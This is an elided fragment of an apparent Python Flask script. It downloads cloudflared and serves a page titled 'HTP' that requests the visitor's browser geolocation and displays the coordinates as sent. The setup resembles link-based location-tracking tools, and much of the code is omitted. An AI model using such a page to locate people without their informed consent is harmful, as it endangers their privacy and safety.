...
def download_cloudflared_for_platform(dest_path: Path):
    ...
    if is_windows():
        ...
        elif machine.startswith("arm") or "armv7" in machine or "armv6" in machine:
...
@app.route("/")
def index():
    return '''<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HTP</title></head><body>
    <h2>HTP — Requesting location...</h2>
    <script>
    // same simple geolocation script
    function send(pos){
      ...
      document.body.innerHTML = "<h3>Location sent</h3><p>Lat: "+pos.coords.latitude+"</p><p>Lon: "+pos.coords.longitude+"</p>";
    }
    function err(e){
